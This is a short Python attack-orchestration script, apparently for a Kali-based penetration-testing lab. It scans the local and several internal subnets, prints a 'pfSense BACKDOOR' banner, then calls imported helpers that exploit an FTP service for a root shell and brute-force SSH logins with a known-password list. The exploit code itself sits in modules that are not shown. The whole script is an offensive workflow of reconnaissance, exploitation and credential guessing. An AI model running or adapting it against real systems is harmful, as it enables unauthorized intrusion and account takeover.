import time
import pyfiglet

from ip_locate import ip_checker
from scan import subnet_ip_scan
from exploit_ftp import exploit_ftp
from exploit_ssh import exploit_ssh_brute

# Some Constants
SUBNET_MASK = "24"
STEP_PAUSE = 1.5

kali_ip_address = ip_checker()
time.sleep(STEP_PAUSE)

hosts_list = subnet_ip_scan(
    ip=kali_ip_address, mask=SUBNET_MASK, keep_self=False, verbose=True
)
time.sleep(STEP_PAUSE)


print(hosts_list)

banner = pyfiglet.figlet_format("Expoit pfSense BACKDOOR")
print(banner)
print("==" * 40)
time.sleep(STEP_PAUSE)

lan_hosts_list = [("10.0.0.1", "up"), ("10.6.6.1", "up"), ("10.80.80.1", "up")]

print(lan_hosts_list)

for i, (lan_hosts_ip, lan_hosts_status) in enumerate(lan_hosts_list):
    subnet_hosts_list = subnet_ip_scan(ip=lan_hosts_ip, mask=SUBNET_MASK)
    print("subnet " + str(i) + " host ip addresses:")
    print(subnet_hosts_list)

root_shell = exploit_ftp(ip="10.6.6.13", port="21")

user_shell = exploit_ssh_brute(
    ip="10.6.6.14", path_to_userpass="./utilities/known_pass.txt"
)
